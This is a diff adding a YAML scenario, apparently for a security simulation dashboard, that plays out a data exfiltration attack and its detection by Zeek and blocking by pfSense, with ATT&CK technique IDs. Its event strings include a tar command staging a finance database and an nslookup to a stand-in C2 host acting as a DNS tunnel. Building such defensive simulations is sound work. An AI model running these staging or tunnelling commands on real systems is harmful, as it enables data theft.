@@ -1,0 +1,61 @@
+id: exfiltration
+name: Data exfiltration
+technique_id: T1048
+description: dns tunnel caught by zeek
+steps:
+  - stage: Staging local archives
+    delay: 1.0
+    event:
+      technique_id: T1005
+      technique_name: Data from Local System
+      event: tar czf /tmp/finance_db.tar.gz /var/lib/data
+      source_ip: 10.0.2.31
+      target_host: ws-02
+      state: DETECTED
+      severity: MEDIUM
+      module: Watch
+      breach: false
+  - stage: Base64 DNS tunnel creation
+    delay: 2.5
+    event:
+      technique_id: T1071
+      technique_name: Application Layer Protocol
+      event: T1071 dns tunnel 10.0.2.31 DETECTED (nslookup q1.c2.darknet.org)
+      source_ip: 10.0.2.31
+      target_host: switch
+      state: DETECTED
+      severity: HIGH
+      module: Watch
+      breach: true
+    host_update:
+      host: ws-02
+      status: suspicious
+      last_alert: T1071 dns tunnel
+  - stage: Zeek anomalous DNS detection
+    delay: 2.0
+    event:
+      technique_id: T1048
+      technique_name: Exfiltration Over Alternative Protocol
+      event: high TXT query volume caught by Zeek sensor (4.2 MB/min)
+      source_ip: 10.0.2.31
+      target_host: switch
+      state: ALERT
+      severity: CRITICAL
+      module: Watch
+      breach: true
+  - stage: DNS socket severing
+    delay: 2.0
+    event:
+      technique_id: T1048
+      technique_name: Exfiltration Over Alternative Protocol
+      event: pfSense severed UDP/53 session for 10.0.2.31
+      source_ip: 10.0.2.31
+      target_host: pfsense
+      state: BLOCKED
+      severity: HIGH
+      module: Reflex
+      breach: false
+    host_update:
+      host: ws-02
+      status: isolated
+      last_alert: T1048 exfiltration blocked
